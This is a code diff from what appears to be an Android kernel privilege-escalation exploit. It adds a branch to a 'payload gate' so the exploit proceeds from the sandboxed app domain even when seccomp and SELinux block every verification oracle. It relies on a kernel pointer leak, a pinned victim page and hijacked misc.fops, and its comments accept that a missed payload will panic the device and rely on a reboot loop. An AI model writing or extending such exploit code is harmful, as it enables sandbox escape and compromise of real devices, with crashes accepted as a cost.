@@ -4042,7 +4042,33 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       pass = content_ok;
     else if (wp_armed)
       pass = wp_capture;
-    else
+    else if (!ks_tracefs() && tpw2.n == 0 && base && drain_held_pages > 0) {
+      /*
+       * app-domain (untrusted_app + zygote seccomp) reality: every content
+       * oracle is structurally unavailable, not merely failing --
+       *   1. tracefs kprobe fetch denied (SELinux: no tracefs write);
+       *   2. the configfs read primitive is inert BEFORE the route (its
+       *      pread only walks configfs_read_file once misc.fops has been
+       *      hijacked -- pre-route a fresh ashmem fd's ->read is the real
+       *      ashmem_read, which returns 0 on an unmapped area: the
+       *      observed "configfs verify failed r1=0 r2=0");
+       *   3. HW watchpoints return EINVAL on this kernel;
+       *   4. the fix42 tp capture windows are dead (seccomp denies
+       *      perf_event_open, so tpw*.n == 0 and hit_evidence is stuck 0).
+       * What DOES hold: the mm_struct leak succeeded (base is a real
+       * direct-map address from the KernelSnitch scan), the victim page is
+       * pinned at base, and the order-3 hold-drain completed.  Proceed
+       * fail-amplified on that behavioral evidence alone: a missed payload
+       * panics the route and the reboot loop absorbs it -- the same
+       * contract as the shell-domain catch-all (run24/25) and the D2
+       * design's documented fallback.  Shell domain never enters here:
+       * Tier-0 kprobe (sudo) gives fv >= 0 and Tier-1 tp windows have
+       * n > 0. */
+      pr_warning("payload gate: no oracle available (app domain); passing "
+                 "on behavioral evidence base=%p drain=%d\n",
+                 (void *)base, drain_held_pages);
+      pass = 1;
+    } else
       pass = drain_capture;
     pr_info("payload gate pass=%d content=%d (fv=%d) wp_armed=%d "
             "wp_capture=%d (n=%lld o=%lld s=%lld) drain=%d (sends=%d "
